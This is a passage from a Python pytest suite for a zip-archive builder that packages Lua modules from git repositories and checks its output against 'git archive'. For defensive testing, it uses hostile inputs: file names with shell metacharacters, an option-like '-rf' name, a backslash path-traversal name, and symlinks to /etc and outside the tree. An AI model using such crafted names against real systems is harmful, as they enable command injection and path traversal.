			{".gitattributes", "keep.txt", "b.lua"}, id="unspecified"),
	pytest.param("dir/ export-ignore\ndir/keep -export-ignore\n", ["dir/keep", "dir/x", "other"],
			{".gitattributes", "other"}, id="ignored-dir-beats-unset-child"),
	pytest.param("name/ export-ignore\n", ["name", "sub/name", "sub2/name/x"],
			{".gitattributes", "name", "sub/name"}, id="dir-pattern-skips-files"),
	pytest.param("/top.txt export-ignore\n", ["top.txt", "sub/top.txt"],
			{".gitattributes", "sub/top.txt"}, id="anchored"),
	pytest.param("**/gen/** export-ignore\n", ["gen/x", "a/gen/y", "a/gen/b/z", "genx/z"],
			{".gitattributes", "genx/z"}, id="double-star"),
	pytest.param("*.tmp export-ignore\n", ["a.tmp", "d/b.tmp", "tmp", "a.tmpx"],
			{".gitattributes", "tmp", "a.tmpx"}, id="extension-glob"),
	pytest.param(None, {"sub/.gitattributes": "inner export-ignore\n", "sub/inner": "", "sub/deeper/inner": "", "inner": ""},
			{"sub/.gitattributes", "inner"}, id="subdir-gitattributes"),
])
def test_archive_export_ignore_patterns(tmp_path, allow_local_urls, attrs, files, expected):
	content = dict(files) if isinstance(files, dict) else {path: path for path in files}
	if attrs is not None:
		content[".gitattributes"] = attrs

	url = build_repo(tmp_path, content)
	names = set(make_archive(url, tmp_path / "out.zip").keys()) - {"pkg/init.lua"}

	assert names == {"pkg/" + name for name in expected}
	reference = git_archive_names(tmp_path / "top", tmp_path / "ref.zip", tmp_path / "home") - {"pkg/init.lua"}
	assert names == reference


def differential_files() -> dict:
	# Incompressible, and deterministic
	big = b"".join(hashlib.sha256(i.to_bytes(4, "big")).digest() for i in range(96000))
	files: dict = {
		"empty": b"",
		"binary.bin": bytes(range(256)) * 4,
		"crlf.txt": b"a\r\nb\r\n",
		"no_newline.txt": b"x",
		"big.bin": big,
		"script.sh": ("exec", b"#!/bin/sh\n"),
		"bin/tool": ("exec", b"\x7fELF" + bytes(100)),
		"with space/a b.lua": "x",
		"quote'\"$;#&`.lua": "x",
		"-rf": "x",
		".hidden": "x",
		"mod_\u00e9.lua": "x",
		"\u65e5\u672c\u8a9e/init.lua": "x",
		"a/" * 20 + "deep.lua": "x",
		"n" * 200 + ".lua": "x",
	}
	for i in range(300):
		files[f"many/f{i:03}.lua"] = str(i)
	return files


def test_archive_matches_git_archive(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, differential_files())
	make_archive(url, tmp_path / "out.zip", max_size=100 * 1024 * 1024)

	ours = read_zip(tmp_path / "out.zip")
	reference = git_archive_entries(tmp_path / "top", tmp_path / "ref.zip", tmp_path / "home")

	assert set(ours) == set(reference)
	assert len(ours) == len(differential_files()) + 1
	assert {name: data for name, (data, _, _) in ours.items()} == {name: data for name, (data, _, _) in reference.items()}
	# git archive only records the mode of executables, so compare the executable bit
	assert {name: bool(mode & 0o111) for name, (_, mode, _) in ours.items()} == \
			{name: bool(mode & 0o111) for name, (_, mode, _) in reference.items()}
	assert {name for name, (_, mode, _) in ours.items() if mode & 0o111} == {"pkg/script.sh", "pkg/bin/tool"}
	assert {name: date for name, (_, _, date) in ours.items()} == {name: date for name, (_, _, date) in reference.items()}


@pytest.mark.parametrize("attrs, content", [
	pytest.param("f.txt eol=crlf\n", b"a\nb\n", id="eol-crlf"),
	pytest.param("f.txt text eol=lf\n", b"a\r\nb\r\n", id="text-eol-lf"),
	pytest.param("f.txt eol=lf\n", b"a\r\nb\r\n", id="eol-lf"),
	pytest.param("f.txt text\n", b"a\r\nb\r\n", id="text"),
	pytest.param("f.txt -text\n", b"a\r\nb\r\n", id="unset-text"),
	pytest.param("f.txt ident\n", b"$Id$\n", id="ident"),
])
def test_archive_applies_checkout_conversions_like_git_archive(tmp_path, allow_local_urls, attrs, content):
	url = build_repo(tmp_path, {"f.txt": content, ".gitattributes": attrs})
	make_archive(url, tmp_path / "out.zip")

	ours = read_zip(tmp_path / "out.zip")
	reference = git_archive_entries(tmp_path / "top", tmp_path / "ref.zip", tmp_path / "home")

	assert ours["pkg/f.txt"][0] == reference["pkg/f.txt"][0]


# Unlike git archive, export-subst is not expanded
def test_archive_does_not_expand_export_subst(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, {"f.txt": "$Format:%h$\n", ".gitattributes": "f.txt export-subst\n"})
	make_archive(url, tmp_path / "out.zip")

	assert read_zip(tmp_path / "out.zip")["pkg/f.txt"][0] == b"$Format:%h$\n"


# Commit dates are chosen by the repo owner, and a zip can only store up to 2107
@pytest.mark.parametrize("commit_time", [4354819198, 7258118400, 99999999999])
def test_archive_clamps_far_future_commit_date(archive_repo, tmp_path, commit_time):
	top = git.Repo(tmp_path / "top")
	top.index.commit("Far future", commit_date=f"{commit_time} +0000", author_date=f"{commit_time} +0000")

	entries = make_archive(archive_repo, tmp_path / "out.zip")
	assert entries["pkg/init.lua"].date_time[0] <= 2107
	assert (tmp_path / "out.zip").exists()


def test_archive_file_limit(archive_repo, tmp_path, monkeypatch):
	monkeypatch.setattr(git_utils, "MAX_ARCHIVE_FILES", 8)
	assert len(make_archive(archive_repo, tmp_path / "exact.zip")) == 8

	monkeypatch.setattr(git_utils, "MAX_ARCHIVE_FILES", 7)
	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="Too many files"):
		make_archive(archive_repo, dest)
	assert not dest.exists()


@pytest.mark.parametrize("name", ["a\\b.lua", "..\\..\\evil.lua", "a\rb.lua", "a\tb.lua", "a\nb.lua", "a\x7fb.lua"])
def test_archive_rejects_bad_names(tmp_path, allow_local_urls, name):
	url = build_repo(tmp_path, {name: ""})
	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="backslash or control character"):
		make_archive(url, dest)
	assert not dest.exists()


def test_archive_skips_submodules_not_checked_out(archive_repo, tmp_path):
	entries = make_archive(archive_repo, tmp_path / "out.zip", recursive=False)
	assert "pkg/init.lua" in entries
	assert not any(name.startswith("pkg/mods/") for name in entries)


def test_archive_size_limit(archive_repo, tmp_path):
	total = sum(info.file_size for info in make_archive(archive_repo, tmp_path / "full.zip").values())

	assert len(make_archive(archive_repo, tmp_path / "exact.zip", max_size=total)) > 0

	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="too large"):
		make_archive(archive_repo, dest, max_size=total - 1)
	assert not dest.exists()


@pytest.mark.parametrize("files, sub_files", [
	({"link.lua": ("link", "init.lua")}, None),
	({"link": ("link", "/etc")}, None),
	({}, {"link.lua": ("link", "../../init.lua")}),
])
def test_archive_rejects_symlinks(tmp_path, allow_local_urls, files, sub_files):
	url = build_repo(tmp_path, files, sub_files)
	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="Symlinks are not supported"):
		make_archive(url, dest)
	assert not dest.exists()


@pytest.mark.parametrize("files, sub_files, sub_path", [
	({"Foo.lua": "", "foo.lua": ""}, None, "mods/sub"),
	({"Docs": "", "docs/readme.txt": ""}, None, "mods/sub"),
	({"SUB/init.lua": ""}, {}, "sub"),
])
def test_archive_rejects_case_collisions(tmp_path, allow_local_urls, files, sub_files, sub_path):
	url = build_repo(tmp_path, files, sub_files, sub_path)
	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="only differ by case"):
		make_archive(url, dest)
	assert not dest.exists()


def test_archive_rejects_path_outside_tree(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, {"docs/readme.txt": ""})
	outside = tmp_path / "outside"
	outside.mkdir()
	(outside / "readme.txt").write_text("secret")

	def replace_docs(root: Path):
		shutil.rmtree(root / "docs")
		os.symlink(outside, root / "docs")

	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="outside the repository"):
		make_archive(url, dest, before=replace_docs)
	assert not dest.exists()


def test_archive_does_not_follow_symlinks(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, {"docs/readme.txt": ""})

	def replace_init(root: Path):
		(root / "init.lua").unlink()
		os.symlink("docs/readme.txt", root / "init.lua")

	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="Unable to read 'init.lua'"):
		make_archive(url, dest, before=replace_init)
	assert not dest.exists()


def test_archive_does_not_block_on_fifo(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, {})

	def replace_init(root: Path):
		(root / "init.lua").unlink()
		os.mkfifo(root / "init.lua")

	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="Not a regular file: 'init.lua'"):
		make_archive(url, dest, before=replace_init)
	assert not dest.exists()


def test_archive_rejects_non_utf8_names(tmp_path, allow_local_urls):
	top = make_repo(tmp_path / "top")
	with open(os.path.join(os.fsencode(top.working_dir), b"caf\xe9.lua"), "w"):
		pass
	commit_files(top, {"ok.lua": ""})

	dest = tmp_path / "out.zip"
	with pytest.raises(TaskError, match="not valid UTF-8"):
		make_archive((tmp_path / "top").as_uri(), dest)
	assert not dest.exists()


def test_archive_keeps_existing_dest(tmp_path, allow_local_urls):
	url = build_repo(tmp_path, {})
	dest = tmp_path / "out.zip"
	dest.write_text("keep")
	with pytest.raises(FileExistsError):
		make_archive(url, dest)
	assert dest.read_text() == "keep"


def test_git_never_uses_shell(local_repo, allow_file_protocol, tmp_path, monkeypatch):
	url, first, second = local_repo
	real_popen = git.cmd.safer_popen
	real_subprocess_popen = subprocess.Popen
	commands = []

	def checked_popen(*args, **kwargs):
		assert not kwargs.get("shell")
		commands.append(args[0])
		return real_popen(*args, **kwargs)

	def checked_subprocess_popen(*args, **kwargs):
		assert not kwargs.get("shell")
		commands.append(args[0])
		return real_subprocess_popen(*args, **kwargs)

	monkeypatch.setattr(git.cmd, "safer_popen", checked_popen)
	monkeypatch.setattr(subprocess, "Popen", checked_subprocess_popen)

	with clone_repo(url) as repo:
		create_archive(repo.working_dir, "pkg", str(tmp_path / "out.zip"), 1024 * 1024)
	with clone_repo(url, "test-branch", recursive=True):
		pass
	get_latest_commit(url)
	get_latest_tag(url)
	get_commit_list(url, first, second)

	assert len(commands) > 0
